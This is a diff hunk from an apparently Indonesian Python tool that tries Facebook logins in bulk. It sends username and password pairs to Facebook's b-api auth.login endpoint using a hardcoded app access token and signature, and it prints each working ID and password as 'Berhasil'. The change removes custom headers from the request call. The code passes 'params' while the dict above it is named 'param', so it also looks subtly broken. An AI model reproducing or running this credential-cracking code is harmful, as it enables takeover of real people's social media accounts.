@@ -758,7 +758,7 @@ class ngewe:
 			ses=req.Session()
 			api="https://b-api.facebook.com/method/auth.login"
 			param={"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32","format": "JSON","sdk_version": "2","email":user,"locale": "en_US","password":pw,"sdk": "ios","generate_session_cookies": "1","sig": "3f555f99fb61fcd7aa0c44f58f522ef6"}
-			send=ses.get(api, params=params, headers=headers_)
+			send=ses.get(api, params=params)
 			if "session_key" in send.text and "EAAA" in send.text:
 				ok+=1
 				print(f"\r{H}Berhasil                \n{N}ID {M}:{H} {user}                \n{N}PW FB {M}:{H} {pw}{N}                \n",end="")
